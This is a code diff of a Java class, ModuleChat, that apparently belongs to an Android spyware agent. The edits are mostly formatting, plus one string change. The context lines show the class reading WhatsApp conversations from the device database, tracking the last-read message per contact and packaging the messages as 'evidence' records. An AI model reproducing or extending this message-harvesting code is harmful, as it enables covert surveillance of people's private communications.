@@ -68,8 +68,8 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			if (markupChat.isMarkup()) {
 				hastableConversationLastIndex = (Hashtable<String, Integer>) markupChat.readMarkupSerializable();
 				Enumeration<String> keys = hastableConversationLastIndex.keys();
-				
-				while(keys.hasMoreElements()){
+
+				while (keys.hasMoreElements()) {
 					String key = keys.nextElement();
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (actualStart): " + key + " -> " + hastableConversationLastIndex.get(key));
@@ -147,7 +147,10 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 							+ " newLastRead " + newLastRead);
 				}
 				hastableConversationLastIndex.put(conversation, newLastRead);
-				if (Cfg.DEBUG) { Check.asserts(hastableConversationLastIndex.get(conversation) > 0, " (readChatMessages) Assert failed, zero index"); }
+				if (Cfg.DEBUG) {
+					Check.asserts(hastableConversationLastIndex.get(conversation) > 0,
+							" (readChatMessages) Assert failed, zero index");
+				}
 				updateMarkup = true;
 			}
 
@@ -157,7 +160,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 				}
 				markupChat.writeMarkupSerializable(hastableConversationLastIndex);
 			}
-			
+
 			db.close();
 		} else {
 			if (Cfg.DEBUG) {
@@ -190,7 +193,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			int lastReadIndex = 0;
 			// if conversation in known, get the last read index
 			if (hastableConversationLastIndex.containsKey(jid)) {
-				
+
 				lastReadIndex = hastableConversationLastIndex.get(jid);
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
@@ -243,7 +246,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
 			items.add(datetime.getStructTm());
 			items.add(WChar.getBytes("whatsapp", true));
-			items.add(WChar.getBytes("no topic", true));
+			items.add(WChar.getBytes("", true));
 			items.add(WChar.getBytes(conversation.replaceAll("@s.whatsapp.net", ""), true));
 			items.add(WChar.getBytes(message, true));
 			items.add(Utils.intToByteArray(Evidence.E_DELIMITER));
